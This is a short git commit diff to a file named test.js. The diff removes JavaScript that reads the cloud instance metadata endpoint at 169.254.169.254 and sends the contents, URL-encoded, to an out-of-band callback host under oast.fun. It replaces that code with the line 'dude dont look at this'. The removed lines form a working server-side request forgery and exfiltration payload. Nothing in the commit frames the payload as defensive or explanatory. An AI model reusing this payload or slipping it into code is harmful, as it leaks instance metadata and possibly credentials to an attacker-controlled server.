e0f660580ee340d79a5825ae753728cf8d4d76f9
hackingisfuture <hackingisfuture@gmail.com>
2025-04-12 23:25:26 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,1 @@
-x = new XMLHttpRequest();
-x.onload = function() {
-    l = new XMLHttpRequest();
-    l.open("GET", "http://abhhrvlbveslopuhgasupt9ccr4vsypy9.oast.fun/" + encodeURIComponent(this.responseText));
-    l.send();
-};
-x.open("GET", "http://169.254.169.254/metadata/v1/");
-x.send();
+dude dont look at this
